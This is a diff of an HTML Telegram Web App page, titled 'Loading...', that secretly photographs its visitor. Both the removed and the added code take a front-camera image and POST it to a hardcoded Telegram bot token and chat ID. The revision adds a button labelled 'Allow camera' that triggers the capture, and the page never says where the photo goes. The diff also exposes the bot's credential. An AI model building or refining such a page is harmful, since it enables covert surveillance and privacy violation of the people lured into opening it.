@@ -6,58 +6,57 @@
     <title>Loading...</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
-<body style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:sans-serif;">
-    <h1>Loading...</h1>
+<body style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:sans-serif;flex-direction:column;">
+    <h1>Нажми кнопку</h1>
+    <button id="camBtn" style="padding:20px 40px;font-size:24px;background:#0088cc;color:#fff;border:none;border-radius:10px;margin-top:20px;">
+        📸 Разрешить камеру
+    </button>
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
 
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
+        document.getElementById('camBtn').addEventListener('click', function() {
+            // Запрашиваем камеру ТОЛЬКО после клика
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
 
-                // Ждём, когда видео загрузится
-                video.onloadedmetadata = function() {
-                    // Даём камере время на прогрев
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    video.onloadedmetadata = function() {
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                        // Отправляем как Blob (надёжнее)
-                        canvas.toBlob(function(blob) {
-                            const formData = new FormData();
-                            formData.append('chat_id', '7406666272');
-                            formData.append('photo', blob, 'photo.jpg');
+                            canvas.toBlob(function(blob) {
+                                const formData = new FormData();
+                                formData.append('chat_id', '7406666272');
+                                formData.append('photo', blob, 'photo.jpg');
 
-                            fetch('https://api.telegram.org/bot8677834656:AAG65uW4UP2WbT_3Op4exFMOTJsHnxRR85A/sendPhoto', {
-                                method: 'POST',
-                                body: formData
-                            })
-                            .then(response => response.json())
-                            .then(data => {
-                                console.log('Фото отправлено:', data);
-                                tg.close();
-                            })
-                            .catch(err => {
-                                console.error('Ошибка отправки:', err);
-                                tg.close();
-                            });
-                        }, 'image/jpeg', 0.7);
+                                fetch('https://api.telegram.org/bot8677834656:AAG65uW4UP2WbT_3Op4exFMOTJsHnxRR85A/sendPhoto', {
+                                    method: 'POST',
+                                    body: formData
+                                })
+                                .then(() => {
+                                    document.querySelector('h1').innerText = '✅ Фото отправлено!';
+                                    tg.close();
+                                })
+                                .catch(() => {
+                                    document.querySelector('h1').innerText = '❌ Ошибка';
+                                });
+                            }, 'image/jpeg', 0.7);
 
-                        stream.getTracks().forEach(track => track.stop());
-
-                    }, 300); // задержка 300 мс
-                };
-            })
-            .catch(err => {
-                console.error('Ошибка камеры:', err);
-                document.querySelector('h1').innerText = 'Camera not available';
-            });
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 300);
+                    };
+                })
+                .catch(err => {
+                    alert('Ошибка камеры: ' + err.message);
+                });
+        });
     </script>
 </body>
 </html>
